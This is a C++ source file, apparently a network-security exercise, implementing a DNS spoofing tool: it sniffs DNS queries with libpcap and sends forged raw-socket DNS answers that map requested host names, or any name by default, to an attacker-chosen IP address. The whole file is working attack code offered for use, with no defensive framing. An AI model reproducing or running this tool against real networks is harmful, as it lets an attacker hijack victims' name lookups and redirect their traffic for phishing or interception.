#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <vector>
#include <map>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <net/ethernet.h>


#define IP_SIZE 16
#define HOST_NAME_SIZE 100
#define DATAGRAM_SIZE 8192

using namespace std;

//structure to hold command line arguments
typedef struct
{
  char* interface;
  char* host_names_file;
  char* expression;
}command_line_args;

//DNS Header and query constructed based on the Wireshark capture
//DNS header definition
struct dnshdr 
{
  char id[2];
  char flags[2];
  char qdcount[2];
  char ancount[2];
  char nscount[2];
  char arcount[2];
};

//DNS query structure
struct dnsquery 
{
  char *query_name;
  char query_type[2];
  char query_class[2];
};

//global variables to be used in the code to save time
std::map<string, string> host_name_spoofed_ip_map;
char* machine_ip;

//Standard function to create a socket and send the spoofed packet to the victim
void send_spoofed_packet(char* ip, short port, char* packet, int packlen) 
{
  struct sockaddr_in to_addr;
  int bytes_sent;
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  int one = 1;
  const int *val = &one;

  if (sock < 0) 
  {
    cout << "Error creating socket\n";
    return;
  }
  to_addr.sin_family = AF_INET;
  to_addr.sin_port = htons(port);
  to_addr.sin_addr.s_addr = inet_addr(ip);
  
  if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
  {
    cout << "Error at setsockopt()\n";
    return;
  }
  
  bytes_sent = sendto(sock, packet, packlen, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));
  if(bytes_sent < 0)
    cout << "Error sending data\n";
  close(sock);
}

//claculate checksum for the header
unsigned short calculate_check_sum(unsigned short *buffer, int word_count)
{
  unsigned long check_sum = 0;
  while(word_count > 0)
  {
    check_sum += *buffer++;
    word_count--;
  }
  check_sum = (check_sum >> 16) + (check_sum & 0xffff);
  check_sum += (check_sum >> 16);
  return ~check_sum;
}

void create_spoofed_ip_udp_headers(char* datagram, unsigned int payload_size, char* src_ip, char* dst_ip, short sport, short dport)
{
  //source and destination IP and ports will be exchanged in the spoofed packet
  struct ip *ip_header = (struct ip *) datagram;
  struct udphdr *udp_hdr = (struct udphdr *) (datagram + sizeof (struct ip));
  
  ip_header->ip_hl = (sizeof*ip_header) >> 2; //header length
  ip_header->ip_v = 4; 
  ip_header->ip_tos = 0; 
  ip_header->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + payload_size;  //length
  ip_header->ip_id = 0; 
  ip_header->ip_off = 0; 
  ip_header->ip_ttl = 255; 
  ip_header->ip_p = 17; // Must be UDP protocol
  ip_header->ip_sum = 0; 
  //exchanging the src and dst IP and ports
  ip_header->ip_src.s_addr = inet_addr (dst_ip); 
  ip_header->ip_dst.s_addr = inet_addr(src_ip);
  
  udp_hdr->source = htons(dport);
  udp_hdr->dest = htons(sport);


  udp_hdr->len = htons(sizeof(struct udphdr) + payload_size);
  udp_hdr->check = 0;
  ip_header->ip_sum = calculate_check_sum((unsigned short *) datagram, ip_header->ip_len >> 1); //real checksum
}

//get the IP address of the interface for the default spoofed response
char* returnMachineIPAddress(char* interface)
{
  int n;
  struct ifreq ifr;
  
  n = socket(AF_INET, SOCK_DGRAM, 0);
  
  ifr.ifr_addr.sa_family = AF_INET;
  
  strncpy(ifr.ifr_name , interface , IFNAMSIZ - 1);
  ioctl(n, SIOCGIFADDR, &ifr);
  close(n);
  return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr )->sin_addr);    
}

//create the dns header
//the default values in the header are hardcoded based on a 
//DNS response header as seen in WireShark
unsigned int create_spoofed_dns_packet(struct dnshdr *dns_hdr, char* spoofed_dns_packet, char* request)
{
  
  unsigned int size = 0;
  struct dnsquery *dns_query;
  unsigned char spoofed_ip_addr[4];
  
  //find if the request name is in the host names file
  std::map<string,string>::iterator it;
  string req_host_name = string(request);
  it = host_name_spoofed_ip_map.find(req_host_name);
  const char* spoofed_ip;
  if(it != host_name_spoofed_ip_map.end())
  {
    spoofed_ip = it->second.c_str();
    //sscanf(it->second.c_str(), "%d.%d.%d.%d",(int *)&spoofed_ip_addr[0],(int *)&spoofed_ip_addr[1], (int *)&spoofed_ip_addr[2], (int *)&spoofed_ip_addr[3]);
  }
  else
  {
    spoofed_ip = machine_ip;
    //sscanf(machine_ip, "%d.%d.%d.%d",(int *)&spoofed_ip_addr[0],(int *)&spoofed_ip_addr[1], (int *)&spoofed_ip_addr[2], (int *)&spoofed_ip_addr[3]);
  }
  sscanf(spoofed_ip, "%d.%d.%d.%d",(int *)&spoofed_ip_addr[0],(int *)&spoofed_ip_addr[1], (int *)&spoofed_ip_addr[2], (int *)&spoofed_ip_addr[3]);  
  cout << "Spoofed IP for the request " << request << " is " << spoofed_ip << endl;
  dns_query = (struct dnsquery*)(((char*) dns_hdr) + sizeof(struct dnshdr));
  
  //populate DNS Header
  memcpy(&spoofed_dns_packet[0], dns_hdr->id, 2);
  memcpy(&spoofed_dns_packet[2], "\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00", 10);

  //populate DNS Query part
  size = strlen(request)+2;// +1 for the size of the first string; +1 for the last '.'
  memcpy(&spoofed_dns_packet[12], dns_query, size); //query_name
  size+=12;
  memcpy(&spoofed_dns_packet[size], "\x00\x01\x00\x01", 4); //type
  size+=4;
  
  //create the Answer part
  //default values are hardcoded
  memcpy(&spoofed_dns_packet[size], "\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x22\x00\x04", 12); //pointer to query_name
  size+=12;
  
  //copy the spoofed response ID to the DNS Packet
  memcpy(&spoofed_dns_packet[size], spoofed_ip_addr, 4); //rdata
  size+=4;
  
  return size;
}

//Extract request name from the DNS query packet
void get_requested_host_name(struct dnsquery *dns_query, char *request)
{
  unsigned int i, j, k;
  char *curr = dns_query->query_name;
  unsigned int size;
  
  size = curr[0];

  j=0;
  i=1;
  
  while(size > 0)
  {
    for(k=0; k<size; k++)
    {
      request[j++] = curr[i+k];
    }
    request[j++]='.';
    i += size;
    size = curr[i++];
  }
  request[--j] = '\0';
}

void parsePacket(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
  struct dnshdr *dns_hdr;
  const struct ethhdr *ethernet;
  char host_name[HOST_NAME_SIZE];
  char src_ip[IP_SIZE], dst_ip[IP_SIZE];

  char src_IP[INET6_ADDRSTRLEN];
  char dst_IP[INET6_ADDRSTRLEN];
  char datagram[DATAGRAM_SIZE];
  char* spoofed_dns_packet;
  unsigned int datagram_size;
  u_short pkt_type;
  struct iphdr * ip;
  struct dnsquery* dns_query;
  
  memset(datagram, 0, DATAGRAM_SIZE);
  
  ethernet = (struct ethhdr*)(packet);
  if(!ethernet)
    return;
  pkt_type = ntohs(ethernet->h_proto);
  if(pkt_type == ETHERTYPE_IP)
  {
    ip = (struct iphdr *)(packet + sizeof(struct ethhdr));
    
    if(!ip)
      return;
    
    short iphdrlen = ip->ihl * 4;
    if(iphdrlen < 20) 
    {
      cout << "Invalid IP header length: " << iphdrlen << " bytes\n";
      return;
    }
    if(ip->protocol == 17)
    {
      inet_ntop(AF_INET,&(ip->saddr),src_ip,sizeof(src_ip));
      inet_ntop(AF_INET,&(ip->daddr),dst_ip,sizeof(dst_ip));
      
      //Extract UDP part
      struct udphdr *udp=(struct udphdr*)(packet + iphdrlen + sizeof(struct ethhdr));
      
      if(!udp)
        return;
          
      short sport = ntohs(udp->source);
      short dport = ntohs(udp->dest);
      if(dport == 53)
      {
        dns_hdr = (struct dnshdr*) (packet + iphdrlen + sizeof(struct ethhdr) + sizeof(struct udphdr));
        dns_query = (struct dnsquery*) malloc(sizeof(struct dnsquery));
        dns_query->query_name = ((char*) dns_hdr) + sizeof(struct dnshdr);        
        get_requested_host_name(dns_query, host_name);
        
        cout << "Trying to spoof the DNS entry for " << host_name << endl;
        spoofed_dns_packet = datagram + sizeof(struct ip) + sizeof(struct udphdr);

        //create the spoofed dns packet and populate the packet
        datagram_size = create_spoofed_dns_packet(dns_hdr, spoofed_dns_packet, host_name);
        
        //populate the IP and UDP part of the packet
        create_spoofed_ip_udp_headers(datagram, datagram_size, src_ip, dst_ip, sport, dport);
        
        datagram_size += (sizeof(struct ip) + sizeof(struct udphdr));
        
        //sends the spoofed packet created above
        send_spoofed_packet(src_ip, sport, datagram, datagram_size);
      } 
    }
  }
}

//split the string based on the delim character
vector<string> split(string str, char delim, int rep) 
{
  string buf = "";
  int i = 0;
  vector<string> split_string;

  if(str[str.size() -1] == '\n')
    str = str.substr(0, str.size() -1);

  if (!split_string.empty()) 
    split_string.clear();  // empty vector if necessary

  while (i < str.length()) 
  {
    if (str[i] != delim)
        buf += str[i];
    else if (rep == 1) 
    {
      split_string.push_back(buf);
      buf = "";
    }
    else if (buf.length() > 0) 
    {
      split_string.push_back(buf);
      buf = "";
    }
    i++;
  }
  if (!buf.empty())
    split_string.push_back(buf);
  return split_string;
}

//create a map ans store the spoofed IP address corresponding to the domain
map<string, string> createHashMap(char* host_file_path)
{
    FILE * fp;
    char * line = NULL;
    size_t len = 0;
    ssize_t read;
    
    fp = fopen(host_file_path, "r");
    if (fp == NULL)
    {
      cout << "Unable to open the host names file. Exiting...\n";
      exit(-1);
    }
    
    while ((read = getline(&line, &len, fp)) != -1) 
    {
      vector<string> flds = split(string(line),' ', 0);
      if(flds.size() > 2)
      {
        cout << "Structure of host names file incorrect. Exiting...\n";
        exit(-1);
      }
      host_name_spoofed_ip_map.insert(std::pair<string, string>(flds[1],flds[0]));
    }

    fclose(fp);
    if (line)
        free(line);
    return host_name_spoofed_ip_map;
}

//Start sniffing
int sniffLiveConnection(command_line_args* args)
{
  char errbuf[PCAP_ERRBUF_SIZE];
  bpf_u_int32 mask;   
  bpf_u_int32 net;    
  struct bpf_program fp;  
  const u_char *packet; 
  struct pcap_pkthdr header;
  char* dev = args->interface;
  char* filter_exp = args->expression == 0 ? NULL : args->expression;
  
  memset(errbuf, 0, PCAP_ERRBUF_SIZE);

  if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) 
  {
    cout << "Couldn't get netmask for device "<< dev << ":" << errbuf << endl;
    net = 0;
    mask = 0;
  }
  
  //Assign handle to the packet connection
  pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 0, errbuf);
  if (handle == NULL) 
  {
    cout << "Couldn't open device "<< dev << ":" << errbuf << endl;
    return(2);
  }
  
  //Compile and apply the filter
  if (pcap_compile(handle, &fp, filter_exp, 0, 0) == -1) 
  {
    cout << "Couldn't parse filter " << filter_exp << ":" << pcap_geterr(handle) << endl;
    return(2);
  }
  
  if (pcap_setfilter(handle, &fp) == -1) 
  {
    cout << "Couldn't install filter " << filter_exp << ":" << pcap_geterr(handle) << endl;
    return(2);
  }
  
  pcap_loop(handle, -1, parsePacket, (u_char*) args);
  pcap_freecode(&fp);
  pcap_close(handle);
}

//parses the command line and return the command_line_args structure
command_line_args* parse_command_line(int argc, char *argv[])
{
  int opt;
  command_line_args* args = (command_line_args*)malloc(sizeof(command_line_args));
  
  while ((opt = getopt(argc, argv, "i:f:")) != -1) 
  {
    switch(opt) 
    {
      case 'i':
        args->interface = optarg;
        break;
      case 'f':
        args->host_names_file = optarg;
        break;
      case '?':
        // when user didn't specify argument
        if (optopt == 'i') 
        {
          cout << "listening interface number must be specified\n";
          exit(1);
        }
        else if (optopt == 'f') 
        {
          cout << "Host names file must be specified\n";
          exit(1);
        } 
        else 
        {
          cout << "Unknown argument!\n";
          exit(1);
        }
      default:
        cout << "Default case?!\n";
        exit(1);
    }
  }
  if (optind == argc - 1) 
  {
    args->expression = argv[optind];
  }
  return args;
}

//Entry point to the program
int main(int argc, char **argv)
{
  char errbuf[PCAP_ERRBUF_SIZE];
  memset(errbuf, 0, PCAP_ERRBUF_SIZE);
  command_line_args* args = parse_command_line(argc, argv);
  //Get the default port to sniff on if interface is not provided
  if(args->interface == 0)
  {
    args->interface = pcap_lookupdev(errbuf);
    if (args->interface == NULL) 
    {
      cout << "Couldn't find default device: " << errbuf << endl;
      return(2);
    }
  }
  cout << "Sniffing on port " << args->interface << " to spoof DNS attacks" << endl;
  
  //get the IP address of the interface
  //To be used in case the host name is not present in the host name file
  machine_ip = returnMachineIPAddress(args->interface);
  if(args->host_names_file != 0)
    map<string, string> spoofed_hostname_ip_map = createHashMap(args->host_names_file);
  
  sniffLiveConnection(args);
  
  return 0;
}